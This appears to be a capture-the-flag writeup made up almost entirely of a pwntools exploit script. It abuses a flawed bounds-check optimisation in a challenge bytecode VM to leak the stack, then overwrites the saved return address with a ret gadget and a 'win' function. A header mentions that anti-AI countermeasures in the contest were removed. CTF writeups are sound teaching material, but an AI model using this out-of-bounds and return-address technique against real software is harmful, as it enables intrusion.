# Note: During the contest, this challenge's description contained anti-AI countermeasures (fake flags and token-padding noise) to deter automated solvers. These have been removed from the published writeup version.

#!/usr/bin/env python3
from pwn import *
import struct

context.arch = 'amd64'
context.log_level = 'info'

# --- VM Opcodes (must match chal.c) ---
OP_LI    = 3
OP_LOAD  = 4
OP_STORE = 5
OP_JLT   = 8
OP_INPUT = 9
OP_HALT  = 10

def asm_inst(op, dst, src1, src2, imm):
    return struct.pack("<BBBBq", op, dst, src1, src2, imm)

# --- Load ELF symbols ---
elf = ELF('../dist/chal', checksec=False)
win_addr = elf.symbols['win']
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
log.success(f"win = {hex(win_addr)}")
log.success(f"ret = {hex(ret_gadget)}")

# --- Bytecode: OOB leak data_mem[idx] into r2 ---
def make_leak_payload():
    code  = asm_inst(OP_LI, 1, 0, 0, 256)     # r1 = 256
    code += asm_inst(OP_INPUT, 0, 0, 0, 0)     # r0 = input(idx)
    code += asm_inst(OP_JLT, 0, 1, 0, 4)       # if r0 < 256 goto HALT (buggy: refines fallthrough max to 255)
    code += asm_inst(OP_LOAD, 2, 0, 0, 0)      # r2 = data_mem[r0]  (bounds check eliminated!)
    code += asm_inst(OP_HALT, 0, 0, 0, 0)
    return code

# --- Bytecode: OOB write ret gadget + win to saved RIP ---
def make_exploit_payload():
    code  = asm_inst(OP_LI, 1, 0, 0, 256)
    code += asm_inst(OP_INPUT, 0, 0, 0, 0)           # r0 = rip_index
    code += asm_inst(OP_LI, 2, 0, 0, ret_gadget)     # r2 = ret gadget
    code += asm_inst(OP_JLT, 0, 1, 0, 5)             # bypass bounds check
    code += asm_inst(OP_STORE, 0, 2, 0, 0)            # data_mem[rip_index] = ret
    code += asm_inst(OP_INPUT, 0, 0, 0, 0)            # r0 = rip_index + 1
    code += asm_inst(OP_LI, 4, 0, 0, win_addr)        # r4 = win
    code += asm_inst(OP_JLT, 0, 1, 0, 9)              # bypass bounds check
    code += asm_inst(OP_STORE, 0, 4, 0, 0)             # data_mem[rip_index+1] = win
    code += asm_inst(OP_HALT, 0, 0, 0, 0)
    return code

def send_bytecode(r, code):
    count = len(code) // 12
    r.sendlineafter(b"Bytecode count: ", str(count).encode())
    r.sendafter(b"bytecode payload:", code)

# --- Stage 1: Leak stack to find saved RIP index ---
log.info("Stage 1: Scanning stack for saved RIP...")
leak_code = make_leak_payload()
saved_rip_index = None

for idx in range(256, 280):
    #r = process('../dist/chal')
    r = remote('localhost', 1337)
    send_bytecode(r, leak_code)
    r.sendlineafter(b"INPUT> ", str(idx).encode())
    try:
        res = r.recvall(timeout=1).decode()
        for line in res.splitlines():
            if "r2:" in line:
                val = int(line.split()[1], 16)
                # -no-pie binary: code segment is 0x400000-0x4fffff
                if 0x400000 <= val <= 0x4fffff:
                    saved_rip_index = idx
                    log.success(f"Saved RIP at data_mem[{idx}] = {hex(val)}")
                    break
    except: pass
    r.close()
    if saved_rip_index:
        break

if not saved_rip_index:
    log.error("Could not find saved RIP")
    exit(1)

# --- Stage 2: Overwrite saved RIP with ret + win ---
log.info(f"Stage 2: Overwriting data_mem[{saved_rip_index}] = ret, data_mem[{saved_rip_index+1}] = win")
exploit_code = make_exploit_payload()

#r = process('../dist/chal')
r = remote('localhost', 1337)
send_bytecode(r, exploit_code)
r.sendlineafter(b"INPUT> ", str(saved_rip_index).encode())
r.sendlineafter(b"INPUT> ", str(saved_rip_index + 1).encode())

r.interactive()
